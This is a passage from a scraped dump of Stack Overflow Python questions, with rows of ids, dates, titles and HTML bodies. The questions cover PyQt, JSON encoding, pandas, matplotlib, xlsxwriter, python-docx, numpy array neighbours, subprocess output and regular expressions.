<p>Obviously PyQt is written in an <em>unpythonic</em> C++ sytle. How <em>should</em> this or a similar problem be handled in Python? According to <a href=""https://www.python.org/dev/peps/pep-0435/"" rel=""nofollow"">PEP 435</a>, enums seem to be a recent addition to the language and for very specific applications, so I would assume there is/was a better way to handle this?</p>

<p>I want to make the code I write easy to use when my functions require specific parameter values--almost like a combobox for functions.</p>
"
40095133,6850579.0,2016-10-17 20:30:17+00:00,2,finding an amount of variable in a text file by python,"<p>I have a variable which its amount is changing every time. I like to know how can I find the line which contained the amount of my variable.
I am looking something like this:
but in this way it looks for the letter of ""A""
how can I write a command which look for its amount(""100"")?
I tried this before</p>

<pre><code>A = 100
with open ('my_file') as f:
    for line in f :
        if ""A"" in line:
           print line
</code></pre>
"
40028755,1828879.0,2016-10-13 18:50:10+00:00,2,Format certain JSON objects on one line,"<p>Consider the following code:</p>

<pre><code>&gt;&gt;&gt; import json
&gt;&gt;&gt; data = {
...     'x': [1, {'$special': 'a'}, 2],
...     'y': {'$special': 'b'},
...     'z': {'p': True, 'q': False}
... }
&gt;&gt;&gt; print(json.dumps(data, indent=2))
{
  ""y"": {
    ""$special"": ""b""
  },
  ""z"": {
    ""q"": false,
    ""p"": true
  },
  ""x"": [
    1,
    {
      ""$special"": ""a""
    },
    2
  ]
}
</code></pre>

<p>What I want is to format the JSON so that JSON objects that have only a single property <code>'$special'</code> are rendered on a single line, as follows.</p>

<pre><code>{
  ""y"": {""$special"": ""b""},
  ""z"": {
    ""q"": false,
    ""p"": true
  },
  ""x"": [
    1,
    {""$special"": ""a""},
    2
  ]
}
</code></pre>

<p>I have played around with implementing a custom <a href=""https://docs.python.org/3/library/json.html#json.JSONEncoder"" rel=""nofollow""><code>JSONEncoder</code></a> and passing that in to <code>json.dumps</code> as the <code>cls</code> argument, but the two methods on <code>JSONEncoder</code> each have a problem:</p>

<ul>
<li><p>The <code>JSONEncoder</code> <a href=""https://docs.python.org/3/library/json.html#json.JSONEncoder.default"" rel=""nofollow""><code>default</code></a> method is called for each part of <code>data</code>, but the return value is not a raw JSON string, so there doesn't appear to be any way to adjust its formatting.</p></li>
<li><p>The <code>JSONEncoder</code> <a href=""https://docs.python.org/3/library/json.html#json.JSONEncoder.encode"" rel=""nofollow""><code>encode</code></a> method does return a raw JSON string, but it is only called once for the <code>data</code> as a whole.</p></li>
</ul>

<p>Is there any way I can get <code>JSONEncoder</code> to do what I want?</p>
"
40094972,1659322.0,2016-10-17 20:19:44+00:00,2,Python - Using decorated function's argument values in the decorator using named arguments,"<p>In continue to: <a href=""https://stackoverflow.com/questions/40061956/python-decorator-that-returns-a-function-with-one-or-more-arguments-replaced/40061972#40061972"">Python decorator that returns a function with one or more arguments replaced</a></p>

<p>I would like to use the values of arguments passed by users in the decorator itself using the argument names. Is it even possible? if it does, how can it be done?</p>

<p>An exmaple: </p>

<p>Let's say my decorator manipulates a simple function, something like:</p>

<pre><code>def f(a, b, c): 
    pass 
</code></pre>

<p>and my decorator manipulates the value of <code>b</code> that is being passed to the function.</p>

<p>Here is my decorator:</p>

<pre><code>def decorate(f):
    def wrapper(*args, **kwargs):
        print('in wrapper', args, kwargs)
        kwargs['b'] = kwargs['b'] * 5
        return f(*args, **kwargs)
    return wrapper
</code></pre>

<p>Let's assume that i know there should b a 'b' in the function, but i'm not sure regarding its position.</p>

<p>I hope that now it's clear. Thanks!</p>
"
40029071,3899919.0,2016-10-13 19:11:12+00:00,2,Setting Series as index,"<p>I'm using python 2.7 to take a numerical column of my dataframe <code>data</code> and make it an individual object (series) with an index of dates that is another column from <code>data</code>. </p>

<pre><code>new_series = pd.Series(data['numerical_column'] , index=data['dates'])
</code></pre>

<p>However, when I do this, I get a bunch of <code>NaN</code> values in the Series: </p>

<pre><code>dates
1980-01-31   NaN
1980-02-29   NaN
1980-03-31   NaN
1980-04-30   NaN
1980-05-31   NaN
1980-06-30   NaN
...
</code></pre>

<p>Why does my <code>numerical_data</code> values just disappear? </p>

<p>I realize that I can apparently achieve this goal by doing the following, although I'm curious why my initial approach failed. </p>

<pre><code>new_series = data.set_index('dates')['numerical_column']
</code></pre>
"
39662555,3599803.0,2016-09-23 13:53:41+00:00,2,python xlsxwriter - wrong category axis in column chart in Excel 2013,"<p>I'm using <code>xlsxwriter</code> to generate a chart. I'm trying to use texts for the category axis, it works in almost every excel version (2007, 2010). But not in excel 2013, and not in Microsoft Excel Online (which seems to be like excel 2013).  </p>

<p>The problem: the category axis is displayed as sequence numbers (1,2,3..), instead of the actual text in the cells. 
This is the relevant part of my the code, which writes the <code>data</code> (a list of 2-sized tuples), and inserts a column chart based on that data.</p>

<pre><code>    xlsxwriter.Workbook('a.xlsx', {'default_date_format': 'dd/mm/yyyy'})
    sheet = workbook.add_worksheet(sheet_name)
    sheet.write_row(0, 0, headers) # Write header row
    sheet.set_column(0, 1, 25) # Column width
    rowCount = 1

    # Write the data
    for text, total in data:
        sheet.write_row(rowCount, 0, (text, total))
        rowCount += 1

    column_chart = workbook.add_chart({'type': 'column'})
    column_chart.set_size({'width': 850, 'height': 600})

    column_chart.set_x_axis({'text_axis': True})
    column_chart.add_series({
        'name': sheet_name,
        'categories': [sheet_name, 1, 0, rowCount, 0], # row, col row, col
        'values': [sheet_name, 1, 1, rowCount, 1],
        'data_labels': {'value': True}
    })
    sheet.insert_chart('D10', column_chart)
    workbook.close()
</code></pre>

<p>As I've said, the code outputs good xlsx, that works in every excel besides 2013. The category axis shows the line number in the sheet (1,2,3..) instead of the text value which is assign to the chart in the <code>categories</code> option.</p>

<p>Thanks in advance</p>
"
39729508,6476722.0,2016-09-27 16:09:42+00:00,2,Colored 3D plot,"<p>I found here this good <a href=""http://stackoverflow.com/questions/12423601/python-the-simplest-way-to-plot-3d-surface"">example</a> to plot 3D data with Python 2.7.</p>

<pre><code>import matplotlib.pyplot as plt
from matplotlib.ticker import MaxNLocator
from matplotlib import cm
from mpl_toolkits.mplot3d import Axes3D
import numpy as np


# ======
## data:

DATA = np.array([
    [-0.807237702464, 0.904373229492, 111.428744443],
    [-0.802470821517, 0.832159465335, 98.572957317],
    [-0.801052795982, 0.744231916692, 86.485869328],
    [-0.802505546206, 0.642324228721, 75.279804677],
    [-0.804158144115, 0.52882485495, 65.112895758],
    [-0.806418040943, 0.405733109371, 56.1627277595],
    [-0.808515314192, 0.275100227689, 48.508994388],
    [-0.809879521648, 0.139140394575, 42.1027499025],
    [-0.810645106092, -7.48279012695e-06, 36.8668106345],
    [-0.810676720161, -0.139773175337, 32.714580273],
    [-0.811308686707, -0.277276065449, 29.5977405865],
    [-0.812331692291, -0.40975978382, 27.6210856615],
    [-0.816075037319, -0.535615685086, 27.2420699235],
    [-0.823691366944, -0.654350489595, 29.1823292975],
    [-0.836688691603, -0.765630198427, 34.2275056775],
    [-0.854984518665, -0.86845932028, 43.029581434],
    [-0.879261949054, -0.961799684483, 55.9594146815],
    [-0.740499820944, 0.901631050387, 97.0261463995],
    [-0.735011699497, 0.82881933383, 84.971061395],
    [-0.733021568161, 0.740454485354, 73.733621269],
    [-0.732821755233, 0.638770044767, 63.3815970475],
    [-0.733876941678, 0.525818698874, 54.0655910105],
    [-0.735055978521, 0.403303715698, 45.90859502],
    [-0.736448900325, 0.273425879041, 38.935709456],
    [-0.737556181137, 0.13826504904, 33.096106049],
    [-0.738278724065, -9.73058423274e-06, 28.359664343],
    [-0.738507612286, -0.138781586244, 24.627237837],
    [-0.738539663773, -0.275090412979, 21.857410904],
    [-0.739099040189, -0.406068448513, 20.1110519655],
    [-0.741152200369, -0.529726022182, 19.7019157715],
])


Xs = DATA[:,0]    
Ys = DATA[:,1]    
Zs = DATA[:,2]


## plot:    
fig = plt.figure()
ax = fig.add_subplot(111, projection='3d')

surf = ax.plot_trisurf(Xs, Ys, Zs, cmap=cm.jet, linewidth=0)
fig.colorbar(surf)

ax.xaxis.set_major_locator(MaxNLocator(5))
ax.yaxis.set_major_locator(MaxNLocator(6))
ax.zaxis.set_major_locator(MaxNLocator(5))

fig.tight_layout()


fig.savefig('3D.png')
plt.show()        
</code></pre>

<p>The result is good:</p>

<p><img src=""http://i.stack.imgur.com/PWIE0.png"" alt=""Output""></p>

<p>But, could it be possible to put this 3D map ""in 2D""? I want to have only the color as the indication for the Z coordinate. As it would be to see this plot ""from the top"".
And to notice, the data (and so z coordinate) come from a measurement, not a function.</p>

<p>I have a lot of data and my computer is very slow...</p>
"
39733443,4813927.0,2016-09-27 20:09:10+00:00,2,Python dictionary sumUp values,"<p>The function below should return a new dictionary which has summed the values up. </p>

<pre><code>import functools
def sumUp(d):
    for k in d:
        d.update({k: functools.reduce(lambda x, y: x + y, d[k])})
    print(d)
</code></pre>

<p>When i call the function as follows i get the following <code>TypeError</code> which i can't understand why:</p>

<pre><code>sumUp({""Ungefucht"": (165, 165, 165, 255, 286.25, 255, 165, 240, 240, 150), ""Malsch"": (120, 240, 120, 120, 120, 120, 120), ""AAA"": (1, 2), ""Fens"": (115.20, 69.60, 28.80, 50.40), ""Betti"": (82.50,)})
</code></pre>

<blockquote>
  <p>Traceback (most recent call last):</p>
  
  <p>File """", line 1, in </p>
  
  <p>File ""/home/amir/programming/python/lern.py"", line 6, in sumUp
      print(d)</p>
  
  <p>TypeError: reduce() arg 2 must support iteration</p>
</blockquote>

<p>When i omit one of the key-values it works fine:</p>

<pre><code>sumUp({""Ungefucht"": (165, 165, 165, 255, 286.25, 255, 165, 240, 240, 150), ""Malsch"": (120, 240, 120, 120, 120, 120, 120), ""AAA"": (1, 2), ""Fens"": (115.20, 69.60, 28.80, 50.40)})
</code></pre>

<blockquote>
  <p>{'Malsch': 960, 'Ungefucht': 2086.25, 'Fens': 264.0, 'AAA': 3}</p>
</blockquote>

<p>Why is the first example with one more item not working as expected?</p>
"
39684796,5500171.0,2016-09-25 08:19:46+00:00,2,Open CV ROI extraction from animated tiff/gif,"<p>I am analysing a greyscale recording of synapses, from which I would like to automatically extract regions of interests (ROIs) as sets of small 'cuts' of the whole animation in order to be able to both trace and account for the movement of the microscope and to profile the Z-axis profile of a particular ROI. This means that I need to scan through the image, identify ROIs and match them 'over the frames', exporting the result as set of frames. Common ROI catching techniques (filtering, averaging over frames via Markov or Fourier and then matching the points) render images which are too blurred/skewed to be used for further analysis and they can't handle the amounts of motion happening in the image, and so I'm trying to come up with a different ROI tracing and extracting mechanism. Any ideas?</p>

<p>To illustrate:
Video (originally huge tiff file, compressed to gif for upload): <a href=""http://i.stack.imgur.com/WRMmc.gif"" rel=""nofollow""><img src=""http://i.stack.imgur.com/WRMmc.gif"" alt=""original recording""></a></p>

<p>Something along the lines of result 
<a href=""http://i.stack.imgur.com/R7Ibw.gif"" rel=""nofollow""><img src=""http://i.stack.imgur.com/R7Ibw.gif"" alt=""Desired result""></a></p>

<p>(this is a cut made in ImageJ, preferably my program would be able to either track my ROI or just cut out enough space to extract most of the on-screen appearance of ROI, but I'm not sure what else can be done)</p>
"
40070037,2280645.0,2016-10-16 12:03:56+00:00,2,Add a legend (like a matplotlib legend) to an image,"<p><strong>Problem : Add a legend (like a matplotlib legend) to an image</strong></p>

<p><strong>Description:</strong></p>

<p>I have an image as a numpy array uint8.
I want to add a legend to it, exactly as matplotlib does with its plots.</p>

<p>My image has , basically, this shape :</p>

<pre><code>output_image = np.empty(shape=(x,x, 4), dtype=np.uint8)
    # B-G-R-A
blue = [255, 0, 0, 255]
green = [0, 255, 0, 255]
red = [0, 0, 255, 255]
orange = [0, 128, 255, 255]
black = [0, 0, 0, 255]
    ...
</code></pre>

<p>The colors above are added.
Then the image is returned. And when it is returned by the method, i would like to add a graphic to it.</p>

<p><strong>Example Below. Instead of the graphic, i would have an image</strong></p>

<p><a href=""https://i.stack.imgur.com/6c6KQ.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/6c6KQ.png"" alt=""Example""></a></p>

<p><strong>Extra Information</strong></p>

<p>The output is a numpy array with values ranging from 0 to 255.
Each pixel, value in the array, is formed by a 4-D array ( Blue-Green-Red-Alpha)</p>

<p>The legend should be added in the bottom right of the image.</p>

<p>The reason is because i have to do it, i guess.</p>

<p>Basically the current output is the numpy array, which i later use for other purposes.</p>
"
39682512,6292577.0,2016-09-25 01:14:20+00:00,2,How to use Python to decrypt files encrypted using Vim's cryptmethod=blowfish2?,"<p>I would like to use Python to decrypt files encrypted using Vim encrypted with the <a href=""http://vim.wikia.com/wiki/Encryption"" rel=""nofollow""><code>cryptmethod=blowfish2</code></a> method. I have not seen the encryption method documented anywhere and would appreciate help in figuring out how to do this.</p>

<p>Is this a standard ability with Python, or has a library been implemented, or other?</p>
"
40069694,6410868.0,2016-10-16 11:23:47+00:00,2,Changing the value of groups with few members in a pandas data frame,"<p>I have a data frame which represent different classes with their values. for example:</p>

<pre><code>df=pd.DataFrame(
 {'label':['a','a','b','a','b','b','a','c','c','d','e','c'],
'date':[1,2,3,4,3,7,12,18,11,2,5,3],'value':np.random.randn(12)})
</code></pre>

<p>I want to choose the labels with values_counts less than a specific threshold and then put them into one class i.e. label them as for example 'zero'. </p>

<p>This is my attemp:</p>

<pre><code>value_count=df.label.value_counts()
threshold = 3
for index in value_count[value_count.values&lt;=threshold].index:
    df.label[df.label==index]='zero'
</code></pre>

<p>Is there a better way to do this?</p>
"
39682688,1107049.0,2016-09-25 01:53:46+00:00,2,How to set PYTHONPATH to multiple folders,"<p>In <code>~/.bash_profile</code> file (OS X) I've set PYTHONPATH to point to two folders:</p>

<pre><code>export PYTHONPATH=/Applications/python/common:$PYTHONPATH
export PYTHONPATH=/Applications/sitecustomize:$PYTHONPATH
</code></pre>

<p>Even while <code>sitecustomize</code> folder is set on a second line (after <code>/common</code>) 
the first path is ignored and I am not able to import any module from the path defined in a first line. What needs to be revised in above syntax to make both folders PYTHONPATHish to Python?</p>
"
40069185,5615090.0,2016-10-16 10:18:28+00:00,2,Setting diagonal mirroring via Jython (user to set points),"<p>Trying to get my my head around this program we need to create
What is needed is as per the notes:
create a function named
arbitraryMirror() that allows the user to place a mirror at an arbitrary angle, causing an intersect and therefore mirror the image.</p>

<p>This will need to be done on either a square or rectangle picture.</p>

<p>As per the pics below, this is the Output of what is required.</p>

<p><a href=""https://i.stack.imgur.com/p31tA.png"" rel=""nofollow"">Output</a></p>

<p>I know how to mirror a pic (as shown below) with a square image, but i cannot work out if this can also be done with a rectangle image?</p>

<p><a href=""https://i.stack.imgur.com/rBFKH.png"" rel=""nofollow"">Cross</a></p>

<p>I had a look at a method of using y=mx+b but it seems overcomplicated?
Maybe there is some coordinate geometry i need? Or algebra?
Any help would be greatly appreciated!</p>
"
39709527,6205649.0,2016-09-26 18:07:50+00:00,2,How do I apply both bold and italics in python-docx?,"<p>I'm working on making a dictionary. I'm using  python-docx to put it into MS Word. I can easily make it bold, or italics, but can't seem to figure out how to do both. Here's the basics:</p>

<pre><code>import docx

word = 'Dictionary'

doc = docx.Document()
p = doc.add_paragraph()
p.add_run(word).bold = True

doc.save('test.docx')
</code></pre>

<p>I have tried p.add_run(word).bold.italic = True, but receive a 'NoneType' error, which I understand.</p>

<p>I have also tried p.bold = True and p.italic = True before and after the add_run, but lose formatting all together.</p>

<p>Word's find/replace is a simple solution, but I'd prefer to do it in the code if I can.</p>
"
40052348,6169031.0,2016-10-14 21:34:29+00:00,2,Iterate QPushButton,"<p>I am using PyQt4. I have a QPushButton and now I want to Iterate it. On button click, it should load data from csv file into QTableWidget. But I want only one case to display at a time. </p>

<p>For example csv has 1000 rows excluding headers. Now it should assign header to table widget from header. and display only one row below it. So on click, it should display next row information in same row. I am posting code below with little different syntax. I displayed syntax of db for header which i also want to exclude it.</p>

<p>I added .ui file. you can save it directly as .ui:</p>

<pre class=""lang-xml prettyprint-override""><code>&lt;?xml version=""1.0"" encoding=""UTF-8""?&gt;
&lt;ui version=""4.0""&gt;
 &lt;class&gt;remarks&lt;/class&gt;
 &lt;widget class=""QMainWindow"" name=""remarks""&gt;
  &lt;property name=""geometry""&gt;
   &lt;rect&gt;
    &lt;x&gt;0&lt;/x&gt;
    &lt;y&gt;0&lt;/y&gt;
    &lt;width&gt;1073&lt;/width&gt;
    &lt;height&gt;862&lt;/height&gt;
   &lt;/rect&gt;
  &lt;/property&gt;
  &lt;property name=""windowTitle""&gt;
   &lt;string&gt;MainWindow&lt;/string&gt;
  &lt;/property&gt;
  &lt;widget class=""QWidget"" name=""centralwidget""&gt;
   &lt;widget class=""QComboBox"" name=""compcb""&gt;
    &lt;property name=""geometry""&gt;
     &lt;rect&gt;
      &lt;x&gt;60&lt;/x&gt;
      &lt;y&gt;360&lt;/y&gt;
      &lt;width&gt;131&lt;/width&gt;
      &lt;height&gt;27&lt;/height&gt;
     &lt;/rect&gt;
    &lt;/property&gt;
   &lt;/widget&gt;
   &lt;widget class=""QComboBox"" name=""loccb""&gt;
    &lt;property name=""geometry""&gt;
     &lt;rect&gt;
      &lt;x&gt;60&lt;/x&gt;
      &lt;y&gt;410&lt;/y&gt;
      &lt;width&gt;131&lt;/width&gt;
      &lt;height&gt;27&lt;/height&gt;
     &lt;/rect&gt;
    &lt;/property&gt;
   &lt;/widget&gt;
   &lt;widget class=""QComboBox"" name=""rescb""&gt;
    &lt;property name=""geometry""&gt;
     &lt;rect&gt;
      &lt;x&gt;60&lt;/x&gt;
      &lt;y&gt;460&lt;/y&gt;
      &lt;width&gt;131&lt;/width&gt;
      &lt;height&gt;27&lt;/height&gt;
     &lt;/rect&gt;
    &lt;/property&gt;
   &lt;/widget&gt;
   &lt;widget class=""QLineEdit"" name=""lat""&gt;
    &lt;property name=""geometry""&gt;
     &lt;rect&gt;
      &lt;x&gt;60&lt;/x&gt;
      &lt;y&gt;540&lt;/y&gt;
      &lt;width&gt;113&lt;/width&gt;
      &lt;height&gt;27&lt;/height&gt;
     &lt;/rect&gt;
    &lt;/property&gt;
   &lt;/widget&gt;
   &lt;widget class=""QLineEdit"" name=""lon""&gt;
    &lt;property name=""geometry""&gt;
     &lt;rect&gt;
      &lt;x&gt;60&lt;/x&gt;
      &lt;y&gt;590&lt;/y&gt;
      &lt;width&gt;113&lt;/width&gt;
      &lt;height&gt;27&lt;/height&gt;
     &lt;/rect&gt;
    &lt;/property&gt;
   &lt;/widget&gt;
   &lt;widget class=""QLineEdit"" name=""landmark""&gt;
    &lt;property name=""geometry""&gt;
     &lt;rect&gt;
      &lt;x&gt;330&lt;/x&gt;
      &lt;y&gt;360&lt;/y&gt;
      &lt;width&gt;113&lt;/width&gt;
      &lt;height&gt;27&lt;/height&gt;
     &lt;/rect&gt;
    &lt;/property&gt;
   &lt;/widget&gt;
   &lt;widget class=""QPlainTextEdit"" name=""sugges""&gt;
    &lt;property name=""geometry""&gt;
     &lt;rect&gt;
      &lt;x&gt;330&lt;/x&gt;
      &lt;y&gt;410&lt;/y&gt;
      &lt;width&gt;121&lt;/width&gt;
      &lt;height&gt;78&lt;/height&gt;
     &lt;/rect&gt;
    &lt;/property&gt;
   &lt;/widget&gt;
   &lt;widget class=""QPlainTextEdit"" name=""plainTextEdit_2""&gt;
    &lt;property name=""geometry""&gt;
     &lt;rect&gt;
      &lt;x&gt;330&lt;/x&gt;
      &lt;y&gt;510&lt;/y&gt;
      &lt;width&gt;121&lt;/width&gt;
      &lt;height&gt;78&lt;/height&gt;
     &lt;/rect&gt;
    &lt;/property&gt;
   &lt;/widget&gt;
   &lt;widget class=""QTableWidget"" name=""tableWidget""&gt;
    &lt;property name=""geometry""&gt;
     &lt;rect&gt;
      &lt;x&gt;20&lt;/x&gt;
      &lt;y&gt;10&lt;/y&gt;
      &lt;width&gt;991&lt;/width&gt;
      &lt;height&gt;311&lt;/height&gt;
     &lt;/rect&gt;
    &lt;/property&gt;
   &lt;/widget&gt;
   &lt;widget class=""QPushButton"" name=""submit""&gt;
    &lt;property name=""geometry""&gt;
     &lt;rect&gt;
      &lt;x&gt;350&lt;/x&gt;
      &lt;y&gt;670&lt;/y&gt;
      &lt;width&gt;99&lt;/width&gt;
      &lt;height&gt;41&lt;/height&gt;
     &lt;/rect&gt;
    &lt;/property&gt;
    &lt;property name=""font""&gt;
     &lt;font&gt;
      &lt;pointsize&gt;12&lt;/pointsize&gt;
      &lt;weight&gt;50&lt;/weight&gt;
      &lt;bold&gt;false&lt;/bold&gt;
     &lt;/font&gt;
    &lt;/property&gt;
    &lt;property name=""text""&gt;
     &lt;string&gt;Submit&lt;/string&gt;
    &lt;/property&gt;
   &lt;/widget&gt;
  &lt;/widget&gt;
  &lt;widget class=""QMenuBar"" name=""menubar""&gt;
   &lt;property name=""geometry""&gt;
    &lt;rect&gt;
     &lt;x&gt;0&lt;/x&gt;
     &lt;y&gt;0&lt;/y&gt;
     &lt;width&gt;1073&lt;/width&gt;
     &lt;height&gt;25&lt;/height&gt;
    &lt;/rect&gt;
   &lt;/property&gt;
  &lt;/widget&gt;
  &lt;widget class=""QStatusBar"" name=""statusbar""/&gt;
 &lt;/widget&gt;
 &lt;resources/&gt;
 &lt;connections/&gt;
&lt;/ui&gt;
</code></pre>

<pre class=""lang-python prettyprint-override""><code>from PyQt4 import QtCore, QtGui, uic
from PyQt4.QtCore import QString

from PyQt4.QtGui import * 
from PyQt4.QtCore import *

import MySQLdb
import os
import time
import sys
import csv 

### Loading .UI file ###
rts_class = uic.loadUiType(""main.ui"")[0]

class Mainwindow(QtGui.QMainWindow, rts_class):
    def __init__(self, parent=None):
        QtGui.QMainWindow.__init__(self, parent)
        self.setupUi(self)

        #self.review.clicked.connect(self, review_application)
        self.submit.clicked.connect(self.submit_application)
        #self.quit.clicked.connect(self, quit_application

        self.load_db()
        self.checkbox()

    def load_db(self):
        self.dadis.setRowCount(1)
        self.dadis.setColumnCount(headlen)
        self.dadis.setHorizontalHeaderLabels(QString('%s' % ', '.join(map(str, mainheader))).split("",""))

        if os.path.isfile(""RTS.csv"") is True:
            with open('RTS.csv', 'r') as fo:
                reader = csv.reader(fo, delimiter = ',')
                ncol = len(next(reader))
                data = list(reader)
                row_count = len(data)

                print row_count
                main =  data[0]

                print main

                for var in range(0, ncol):                                                  
                    self.dadis.setItem(0, var, QTableWidgetItem(main[var]))

                fo.close()

    def checkbox(self):
        self.compcb.addItem("" "")
        self.compcb.addItem(""Complete"")
        self.compcb.addItem(""InComplete"")

        self.loccb.addItem("" "")
        self.loccb.addItem(""Locatable"")
        self.loccb.addItem(""UnLocatable"")

        self.rescb.addItem("" "")
        self.rescb.addItem(""House"")
        self.rescb.addItem(""Street"")
        self.rescb.addItem(""Colony"")
        self.rescb.addItem(""Society"")            

    def submit_application(self):
        compout = self.compcb.currentText()
        locout = self.loccb.currentText()
        resout = self.rescb.currentText()
        lattxt = self.lat.text()
        lontxt = self.lon.text()
        landtxt = self.landmark.text()
        suggestxt = self.sugges.toPlainText()
        remarkstxt = self.remarks.toPlainText()

        print compout
        print locout
        print resout
        print lattxt
        print lontxt
        print landtxt
        print suggestxt
        print remarkstxt

        if os.path.isfile(""rts_output.csv"") is False:

            with open('rts_output.csv', 'a') as fp:
                b = csv.writer(fp, delimiter = ',')
                header = [[""COMPLETENESS"", ""LOCATABLE"", ""RESOLUTION"", ""GEO_LAT"", ""GEO_LON"", ""LANDMARK"", ""SUGGESTION"", ""REMARKS""]]
                b.writerows(header)

        if os.path.isfile(""rts_output.csv"") is True:

            with open('rts_output.csv', 'a') as fp:
                a = csv.writer(fp, delimiter = ',' )
                data = [[compout, locout, resout, lattxt, lontxt, landtxt, suggestxt, remarkstxt]]
                a.writerows(data)   

        if os.path.isfile(""RTS.csv"") is True:

            with open('RTS.csv', 'r') as fo:
                reader = csv.reader(fo, delimiter = ',')
                ncol = len(next(reader))
                data = list(reader)
                row_count = len(data)

                x = data[0][0]
                print x

                i = int(x)+1
                print i

                if i &lt;= row_count:

                    main =  data[i-1]

                    print main

                #for var in range(0, ncol):                                                  
                    #self.dadis.setItem(0, var, QTableWidgetItem(main[var]))

            fo.close()


if __name__ == '__main__':
    app = QtGui.QApplication(sys.argv)
    myMain = Mainwindow()
    myMain.show()
    sys.exit(app.exec_())
</code></pre>
"
39708662,6406655.0,2016-09-26 17:15:19+00:00,2,How does __setattr__ work with class attributes?,"<p>I am trying to understand how exactly __setattr__ works with class attributes. This question came about when I had attempted to override __setattr__ to prevent attributes from being written to in a simple class.</p>

<p>My first attempt used instance level attributes as follows:</p>

<pre><code>class SampleClass(object):

    def __init__(self):
        self.PublicAttribute1 = ""attribute""

    def __setattr__(self, key, value):
        raise Exception(""Attribute is Read-Only"")
</code></pre>

<p>I had originally thought that only external attempts to set the attribute would throw an error, but even the statement inside the __init__ caused the exception to be thrown.</p>

<p>Later I ended up finding another way to do this, while attempting to solve a different problem. What I ended up with was:</p>

<pre><code>class SampleClass(object):
    PublicAttribute1 = ""attribute""

    def __setattr__(self, key, value):
        raise Exception(""Attribute is Read-Only"")
</code></pre>

<p>I expected to get the same result, but to my surpirse I was able to set the class attribute while preventing changes from being made after the initial declaration. </p>

<p>I don't understand why this works though. I know it has to do with class vs. instance variables. My theory is that using __setattr__ on a class variable will create an instance variable of the same name, since I believe I think I have seen this behavior before, but I am not sure.</p>

<p>Can anyone explain exactly what is happening here?</p>
"
39708568,3352404.0,2016-09-26 17:09:43+00:00,2,Find elements based on neighbor values,"<p>I would like to know if there is an efficient way to find indexes of elements next to a specific value in a Numpy array.</p>

<p>How can I find indexes of all the elements that are equal to 1 and that are next to a 0 in this array A ?  Without a loop checking for the value of the 8 surrounded elements for each element ?</p>

<pre><code>       A = [[ 0.,  0.,  0.,  0.,  0.,  0.],
           [ 0.,  1.,  1.,  1.,  1.,  0.],
           [ 0.,  1.,  1.,  1.,  1.,  0.],
           [ 0.,  1.,  1.,  1.,  1.,  0.],
           [ 0.,  1.,  1.,  1.,  1.,  0.],
           [ 0.,  0.,  0.,  0.,  0.,  0.]]
</code></pre>

<p>I would expect getting the indexes from a result like this :</p>

<pre><code>              [[ False,  False,  False,  False,  False, False],
               [ False,  True,   True,   True,   True,  False],
               [ False,  True,   False,  False,  True,  False],
               [ False,  True,   False,  False,  True,  False],
               [ False,  True,   True,   True,   True,  False],
               [ False,  False,  False,  False,  False, False]]
</code></pre>

<p>I used canny edge detection but it does not always work for elements that only have one 0 on the North/South-West or North/South-East neighbor. For example :</p>

<pre><code>           B = [[ 1.,  0.,  0.],
               [ 1.,  0.,  0.],
               [ 1.,  1.,  1.]]
</code></pre>

<p>can lead to</p>

<pre><code>                   [[ True,  False,  False],
                   [ True,   False,  False],
                   [ False,  True,   True]]
</code></pre>

<p>instead of </p>

<pre><code>                       [[ True,  False,  False],
                       [ True,   False,  False],
                       [ True,   True,   True]]
</code></pre>

<p>Thanks</p>

<p>update 1 : I did try first canny edge detection form scikit.image but it misses elements. I then tried with np.gradient with same results.</p>

<p>update 2 : Example :</p>

<pre><code>B=np.array([[1,1,1,0,0,0,0],
            [1,1,1,0,0,0,0],
            [1,1,1,1,0,0,0],
            [1,1,1,1,0,0,0],
            [1,1,1,1,1,0,0],
            [1,1,1,1,1,0,0],
            [1,1,1,0,0,0,0],
            [1,1,1,1,0,0,0]])
</code></pre>

<p>On this example, both the canny edge detection, the gradient method, and the ndimage.laplace (method mentioned in the answer below) lead to the same results, with missing elements (in yellow on the figure)
<a href=""http://i.stack.imgur.com/bCToO.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/bCToO.png"" alt=""results""></a></p>

<p>update 2:</p>

<p>Here is the looping method</p>

<pre><code>def check_8neigh_Value(arr,eltvalue, neighvalue):
   ""checking if the element of value=eltvalue is surrounded 
    by the value=neighvalue and returning the corresponding grid""

   l, c = np.shape(arr)
   contour = np.zeros(np.shape(arr))
   for i in np.arange(1,l-1):
      for j in np.arange(1,c-1):
         window = arr[i-1:i+2, j-1:j+2]
         if np.logical_and(arr[i,j]==eltvalue,neighvalue in window):
            contour[i,j]=1

return contour

image=check_8neigh_Value(B,1,0)
</code></pre>

<p>It gives me what I am looking for, however it is not efficient on large array.</p>

<p>I am stuck with the as_strided method, since I don't low how to use the result:</p>

<p>For a 3 by 3 window using the array B, I am able to get the as_stried B but can't get further.</p>

<pre><code>window_h=3
window_w=3
l, c = image.shape
l_new, c_new = l - window_h + 1, c - window_w + 1
shape=[c_new, l_new, window_w, window_h]
strides=B.strides + B.strides
strided_image = np.lib.stride_tricks.as_strided(B,shape=shape,strides=strides)
</code></pre>
"
39708247,6573388.0,2016-09-26 16:50:13+00:00,2,Function with multiple options of returns,"<p>Sorry, if this question was already answered, I couldn't think of a better way to describe this problem :/</p>

<p>Let's say I have a function like this:</p>

<pre><code>def func(arg):
    if arg something:
        return a, b, c, d
    else:
        return False
</code></pre>

<p>So, when i call this function like this:</p>

<pre><code>a, b, c, d = func(arg)
</code></pre>

<p>and it happens, that the function only returns False -would this create a problem (since I'm assigning 4 variables but only getting 1 bool) ? </p>
"
40068695,4990319.0,2016-10-16 09:11:55+00:00,2,How to edit string from STDOUT,"<p>I have this code:</p>

<pre><code>netshcmd = subprocess.Popen('netsh wlan stop hostednetwork', shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
output, errors = netshcmd.communicate()
if errors:
    print(""Warrning: "", errors)
else:
    print(""Success"", output)
</code></pre>

<p>and output is this: </p>

<pre><code>Success b'The hosted network stopped. \r\n\r\n'
</code></pre>

<p>How to get output like this ""Success The hosted network stopped.""?</p>
"
40053653,4159271.0,2016-10-15 00:08:05+00:00,2,Python Regular Expression [\d+],"<p>I am working on regular expression python, I came across this problem.</p>

<p>A valid mobile number is a ten digit number starting with a 7,8 or 9.
my solution to this was :</p>

<pre><code>if len(x)==10 and re.search(r'^[7|8|9]+[\d+]$',x):
</code></pre>

<p>for which i was getting error. later I changed it to</p>

